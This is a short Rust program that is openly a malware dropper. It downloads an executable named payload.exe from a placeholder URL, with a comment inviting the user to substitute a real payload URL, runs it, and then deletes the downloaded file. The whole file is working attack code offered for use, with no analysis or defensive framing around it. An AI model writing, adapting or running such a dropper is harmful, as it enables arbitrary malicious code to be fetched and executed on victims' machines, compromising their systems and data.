use std::fs;
use std::io::{self, Write};
use std::net::TcpStream;
use std::process::Command;
use std::time::Duration;

const PAYLOAD_URL: &str = "http://example.com/payload"; // Replace with your actual payload URL
const PAYLOAD_NAME: &str = "payload.exe"; // Name of the downloaded payload

fn download_payload(url: &str, filename: &str) -> Result<(), String> {
    let response = reqwest::blocking::get(url)
        .map_err(|e| format!("Failed to send request: {}", e))?;
    
    let mut file = fs::File::create(filename).map_err(|e| format!("Failed to create file: {}", e))?;
    let content = response.bytes().map_err(|e| format!("Failed to read response: {}", e))?;
    
    file.write_all(&content).map_err(|e| format!("Failed to write to file: {}", e))?;
    Ok(())
}

fn execute_payload(filename: &str) -> Result<(), String> {
    Command::new(filename)
        .spawn()
        .map_err(|e| format!("Failed to execute payload: {}", e))?;
    Ok(())
}

fn clean_up(filename: &str) -> Result<(), String> {
    fs::remove_file(filename).map_err(|e| format!("Failed to delete file: {}", e))
}

fn main() {
    // Download payload
    if let Err(e) = download_payload(PAYLOAD_URL, PAYLOAD_NAME) {
        eprintln!("Error: {}", e);
        return;
    }

    // Execute payload
    if let Err(e) = execute_payload(PAYLOAD_NAME) {
        eprintln!("Error: {}", e);
        return;
    }

    // Clean up the dropper itself if needed
    if let Err(e) = clean_up(PAYLOAD_NAME) {
        eprintln!("Cleanup error: {}", e);
    }
}

